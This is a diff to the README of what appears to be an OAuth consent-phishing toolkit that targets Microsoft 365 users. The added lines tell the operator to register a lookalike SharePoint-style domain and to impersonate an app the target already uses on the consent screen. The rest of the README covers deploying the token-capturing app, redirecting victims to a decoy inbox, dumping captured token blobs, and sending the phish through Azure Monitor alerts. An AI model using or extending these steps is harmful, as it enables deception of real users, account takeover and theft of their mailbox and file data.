@@ -48,6 +48,7 @@ Set subscription RBAC: portal → **Subscriptions** → your sub → **Access co
 npx vercel login
 npx vercel link --yes   # creates the project and gives you the .vercel.app URL
 ```
+your then gonna make a project in the websit and then click add domain then add a domain like  `<name of a web app the target uses>-sharepoint-access-portal.vercel.app` this is free amd only requiers a email but you could use firebase + fier store wich you reqiuers CC but gives a .app.web domaine 
 
 ```bash
 # Azure — must be a work/school account (Entra tenant member), not a personal @outlook.com/@hotmail.com
@@ -74,7 +75,7 @@ TRUST_PROXY=1
 
 | Variable | What it is | Where to get it |
 |---|---|---|
-| `DISPLAY-NAME` | The app name shown on Microsoft's consent screen. | Pick anything that looks legitimate |
+| `DISPLAY-NAME` | The app name shown on Microsoft's consent screen. | you hsould chang it to a app name that your taget also uses |
 | `SCOPES` | Space-separated delegated Graph permissions. **`openid` is required** — without it there's no `id_token` and user identity can't be extracted. | [Graph permissions reference](https://learn.microsoft.com/graph/permissions-reference) |
 | `REDIRECT_URI` | OAuth redirect URI — must be HTTPS and match exactly what's registered on the app. | `https://<your-vercel-url>/login/authorized` |
 | `DECOY_URL` | Where the target lands after consenting (or on silent failure). | `https://outlook.office365.com/mail/inbox` looks natural |
@@ -97,15 +98,10 @@ Safe to re-run — it finds an existing app by `CLIENT_ID` or display name rathe
 
 ### 5. Deploy
 
+run deploy after filling out env file
 ```bash
 npm run deploy
 ```
-
-Runs three things in sequence:
-
-1. `az-setup.sh` — registers the Azure resource providers (`Microsoft.Insights`, `Microsoft.AlertsManagement`) that `go:phish` needs. Safe to re-run, checks state before acting.
-2. `sync-env.js` — pushes every value in `.env` into Vercel project env (production).
-3. `vercel deploy --prod` — builds and promotes. The aliased URL prints at the end.
 
 ### 6. Send the phish
 
@@ -125,7 +121,7 @@ Creates a disposable Azure resource group, action group, and activity-log alert 
 | `npm test` | Run the test suite (in-memory store, mocked token endpoint). |
 | `npm run db:dump` | curl `/admin/export` with the bearer from `.env`; prints all captured token blobs as JSON. |
 | `npm run db:clear` | Wipe every record from Redis. |
-| `npm run consent:revoke [user@domain]` | Delete the Entra `oauth2PermissionGrant` via `az` so the next visit shows the consent screen fresh. Defaults to the currently `az`-logged-in user. |
+| `npm run kill:Users [user@domain]` | Delete the Entra `oauth2PermissionGrant` via `az` so the next visit shows the consent screen fresh. Defaults to the currently `az`-logged-in user. |
 | `npm run go:phish -- --e <target@email>` | Create a disposable Azure Monitor action group + activity-log alert that delivers the phish email to `<target@email>`, then cleans up after ~15 min. Requires `az login` and Owner/Contributor on the subscription. |
 
 ## Rotating secrets
